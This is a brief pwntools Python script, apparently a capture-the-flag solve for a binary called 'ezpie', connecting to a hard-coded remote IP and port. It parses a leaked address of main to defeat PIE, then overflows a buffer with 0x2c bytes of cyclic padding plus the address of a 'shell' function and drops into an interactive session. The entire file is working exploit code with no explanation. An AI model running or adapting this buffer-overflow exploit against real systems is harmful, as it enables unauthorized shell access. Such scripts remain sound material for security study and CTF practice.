from pwn import *
context(log_level='debug',os='linux',arch='x86',terminal=['tmux','splitw','-h'])

# io=process("./ezpie")
io=remote("1.14.71.254",28585)
elf=ELF("./ezpie")
io.recvline()
base_addr=int(io.recvline(),16)-elf.sym[b"main"]
# gdb.attach(io)
# pause()
payload=cyclic(0x2c)+p32(base_addr+elf.sym[b"shell"])
# payload=cyclic(0x2c)+p32(base_addr+elf.sym[b"shell"])
io.sendline(payload)
io.interactive()